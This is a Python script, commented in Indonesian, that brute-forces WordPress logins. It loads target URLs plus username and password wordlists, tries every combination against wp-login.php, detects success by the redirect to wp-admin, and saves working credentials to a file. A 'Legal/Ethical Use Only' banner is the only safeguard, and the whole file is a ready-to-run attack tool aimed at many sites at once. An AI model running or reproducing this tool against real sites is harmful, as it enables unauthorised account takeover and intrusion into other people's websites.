import requests
from concurrent.futures import ThreadPoolExecutor
import time
import os
from colorama import Fore, Style, init

# Inisialisasi colorama untuk warna terminal
init(autoreset=True)

# Fungsi untuk mencoba login WordPress
def try_wp_login(url, username, password):
    login_url = f"{url}/wp-login.php"
    admin_url = f"{url}/wp-admin/"
    
    # Data payload untuk WordPress
    data = {
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": admin_url
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }
    
    try:
        session = requests.Session()
        response = session.post(login_url, data=data, headers=headers, timeout=10)
        
        # Cek apakah login berhasil (redirect ke wp-admin)
        if any("wp-admin" in r.url for r in response.history) or "wp-admin" in response.url:
            with open(SAVE_FILE, "a") as f:
                f.write(f"[SUCCESS] {url} | {username}:{password}\n")
            print(f"{Fore.GREEN}[+] SUCCESS: {url} | {username}:{password}{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}[-] FAILED: {url} | {username}:{password}{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.YELLOW}[!] ERROR on {url}: {e}{Style.RESET_ALL}")
        return False

# Baca wordlist dari file
def load_wordlist(filename):
    try:
        with open(filename, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] File {filename} tidak ditemukan!{Style.RESET_ALL}")
        return []

# Proses brute-force untuk satu URL
def brute_force_wp(url, usernames, passwords):
    print(f"\n{Fore.CYAN}[*] Memulai brute-force pada: {url}{Style.RESET_ALL}")
    success_count = 0
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        for username in usernames:
            for password in passwords:
                if try_wp_login(url, username, password):
                    success_count += 1
    
    print(f"{Fore.CYAN}[*] Selesai! Login berhasil di {url}: {success_count}{Style.RESET_ALL}")

# Main program
def main():
    global SAVE_FILE
    
    print(f"""
    {Fore.BLUE}[+] WordPress Brute-Force Tool (Legal/Ethical Use Only!){Style.RESET_ALL}
    """)
    
    # Input file URL target
    url_file = input("Masukkan file daftar URL (contoh: urlnow.txt): ").strip()
    if not os.path.exists(url_file):
        print(f"{Fore.RED}[!] File {url_file} tidak ditemukan!{Style.RESET_ALL}")
        return
    
    # Input file username & password
    username_file = input("Masukkan file username (default: username.txt): ").strip() or "username.txt"
    password_file = input("Masukkan file password (default: password.txt): ").strip() or "password.txt"
    
    SAVE_FILE = input("Masukkan file untuk menyimpan hasil (default: save.txt): ").strip() or "save.txt"
    
    # Load semua wordlist
    urls = load_wordlist(url_file)
    usernames = load_wordlist(username_file)
    passwords = load_wordlist(password_file)
    
    if not urls or not usernames or not passwords:
        print(f"{Fore.RED}[!] Error: File URL/username/password kosong atau tidak ditemukan!{Style.RESET_ALL}")
        return
    
    print(f"\n{Fore.BLUE}[*] Target URL: {len(urls)}")
    print(f"[*] Username list: {len(usernames)}")
    print(f"[*] Password list: {len(passwords)}")
    print(f"[*] Hasil akan disimpan di: {SAVE_FILE}{Style.RESET_ALL}")
    
    input("\nTekan Enter untuk memulai brute-force...")
    
    start_time = time.time()
    
    # Proses setiap URL
    for url in urls:
        brute_force_wp(url, usernames, passwords)
    
    elapsed_time = time.time() - start_time
    print(f"\n{Fore.GREEN}[+] Total waktu eksekusi: {elapsed_time:.2f} detik{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
